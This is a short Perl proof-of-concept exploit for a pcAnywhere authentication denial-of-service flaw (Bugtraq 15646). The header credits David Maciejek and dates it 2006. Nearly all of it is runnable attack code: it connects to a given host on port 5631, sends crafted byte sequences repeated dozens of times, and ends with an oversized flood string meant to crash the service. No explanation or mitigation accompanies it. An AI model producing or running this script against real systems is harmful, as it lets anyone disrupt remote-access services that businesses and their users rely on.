#!/usr/bin/perl -w
# Version 2.0
#
# PoC for
# pcAnywhere Authentication Denial of Service Vulnerability
# Bugtraq ID: 	15646
#
# Tested on pcanywhere v11.0 and v11.0.1
#
# Author: David Maciejak
# Date: 20060117
#
##############################

use IO::Socket;

if (@ARGV<1)
{
	die "usage: $0 pcanywhere_ip [port]";
}

$host=$ARGV[0];
$port=$ARGV[1] || 5631;

$|=1;

$cl1="\x00\x00\x00\x00";
$cl2="\x6F\x06\xff"; 
$cl3="\x6f\x61\x00\x09\x00\xfe\x00\x00\xff\xff\x00\x00\x00\x00";
$cl4="\x6f\x62\x01\x02\x00\x00\x00";

$sock = IO::Socket::INET->new( PeerAddr => $host,
		 	  PeerPort => $port,
			  Proto => 'tcp'
			);
		
die "Could not create socket: $! \n" unless $sock;

$sock->send($cl1);
$sock->recv($buff,32768);
$sock->send($cl2 x 50);
$sock->recv($buff,32768);
$sock->send($cl3 x 50);
$sock->recv($buff,32768);
$sock->send($cl4);
$sock->recv($buff,32768);

$str='\x06'.'\x04'.'\0xffffffc0'x300;
$sock->send($str x 50);
close $sock;

